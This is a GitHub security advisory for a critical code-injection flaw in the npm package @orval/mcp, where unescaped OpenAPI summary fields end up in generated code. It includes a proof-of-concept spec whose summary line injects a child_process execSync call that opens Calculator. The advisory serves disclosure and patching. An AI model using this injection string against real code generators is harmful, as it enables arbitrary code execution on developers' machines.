# [C] orval MCP client is vulnerable to a code injection attack.

## Summary
Severity: Critical
Advisory: GHSA-mwr6-3gp8-9jmj
CVE: CVE-2026-22785
CWE: CWE-77
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-01-13
Source: https://github.com/advisories/GHSA-mwr6-3gp8-9jmj
Type: github-advisory

## Affected
- npm: `@orval/mcp` — affected >=0 <7.18.0

## Details
### Impact
The MCP server generation logic relies on string manipulation that incorporates the summary field from the OpenAPI specification without proper validation or escaping. This allows an attacker to "break out" of the string literal and inject arbitrary code.

Here is an example OpenAPI with the exploit

```yaml
openapi: 3.0.4
info:
  title: Swagger Petstore - OpenAPI 3.0
  description: |-
    This is a sample Pet Store Server based on the OpenAPI 3.0 specification.  You can find out more about
    Swagger at [https://swagger.io](https://swagger.io). In the third iteration of the pet store, we've switched to the design first approach!
    You can now help us improve the API whether it's by making changes to the definition itself or to the code.
    That way, with time, we can improve the API in general, and expose some of the new features in OAS3.

    Some useful links:
    - [The Pet Store repository](https://github.com/swagger-api/swagger-petstore)
    - [The source API definition for the Pet Store](https://github.com/swagger-api/swagger-petstore/blob/master/src/main/resources/openapi.yaml)
  termsOfService: https://swagger.io/terms/
  contact:
    email: apiteam@swagger.io
  license:
    name: Apache 2.0
    url: https://www.apache.org/licenses/LICENSE-2.0.html
  version: 1.0.27-SNAPSHOT
externalDocs:
  description: Find out more about Swagger
  url: https://swagger.io
servers:
  - url: https://petstore3.swagger.io/api/v3
tags:
  - name: pet
    description: Everything about your Pets
    externalDocs:
      description: Find out more
      url: https://swagger.io
  - name: store
    description: Access to Petstore orders
    externalDocs:
      description: Find out more about our store
      url: https://swagger.io
  - name: user
    description: Operations about user
paths:
  /pet/findByStatus:
    get:
      tags:
        - pet
      summary: Finds Pets by status.' + require('child_process').execSync("open -a Calculator").toString(),//
      description: Multiple status values can be provided with comma separated strings.
      operationId: findPetsByStatus
      parameters:
        - name: status
          in: query
          description: Status values that need to be considered for filter
          schema:
            type: string
      responses:
        '200':
          description: successful operation
          content:
            application/json:
              schema:
                type: string
        '400':
          description: Invalid status value
        default:
          description: Unexpected error
      security:
        - petstore_auth:
            - write:pets
            - read:pets
 ```
  

### Patches
This is fixed in version 7.18.0 or higher

### Workarounds
Do check your generated OpenAPI yaml/json before running through Orval CLI and correct it if it has injection.

## References
- https://github.com/orval-labs/orval/security/advisories/GHSA-mwr6-3gp8-9jmj
- https://nvd.nist.gov/vuln/detail/CVE-2026-22785
- https://github.com/orval-labs/orval/commit/80b5fe73b94f120a3a5561952d6d4b0f8d7e928d
- https://github.com/orval-labs/orval
